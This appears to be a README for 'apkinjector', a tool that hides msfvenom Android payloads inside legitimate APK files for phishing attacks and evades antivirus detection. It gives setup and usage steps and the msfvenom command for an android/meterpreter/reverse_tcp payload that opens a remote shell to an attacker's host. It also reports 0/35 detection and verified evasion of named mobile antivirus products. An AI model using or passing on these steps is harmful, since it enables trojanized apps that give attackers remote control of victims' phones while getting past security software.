# apkinjector
Android APK Antivirus evasion for msfvenom generated payloads to inject into another APK file for phishing attacks.
<br><br>
<b> -- Please do not upload "injected" files to VirusTotal.com -- </b><br>
<br>
<br>
<b>CURRENTLY NEEDS WORK. Tested against 2 apps with no issues. On the 3rd app the grep was unable to locate the MAIN function smali launcher in AndroidManifest.xml. Need to refine this, or simple allow the user to copy/paste the smali path into the code to automate from that point</b>
<br><br>
Plan to use something like the following: grep -B 3 -A 2 android.intent.action.MAIN /tmp/original/AndroidManifest.xml <br>
Just need to implement it. Will get to it soon.<br>
<br><br>
<b>Setup:</b><br>
chmod +x apkinjector<br>
mv apkinjector /usr/local/bin/.<br>
<br>
<b>On first run:</b><br>
-Downloads and places apktool.jar in the user's /usr/local/bin directory<br>
-Generates debug keystore for signing. Places it in ~/.android/<br>
<b>NOTE:</b> If wanting to customize each signature, then remove the keystore before running the script.<br>
<br>
<b>Usage:</b><br>
apktool \<payload>.apk \<original>.apk<br>
<br>
<b>Input:</b><br>
This script takes a msfgenerated payload as input along with an .apk you want to inject into.<br>
To generate the payload: msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT<PORT> -o \<payload>.apk<br>
<br>
<b>Output:</b><br>
injected_\<original>.apk<br>
<br>
<b>Antivirus detection:</b><br>
0/35 on nodistribute - 16Feb17<br>
Verified for AVG mobile<br>
Verified for Kaspersky mobile<br>
<br>
<br>
<b>Debugging</b><br>
Comment out the removal of the /tmp/payload and /tmp/original directories to see the file structure that was compiled.<br>
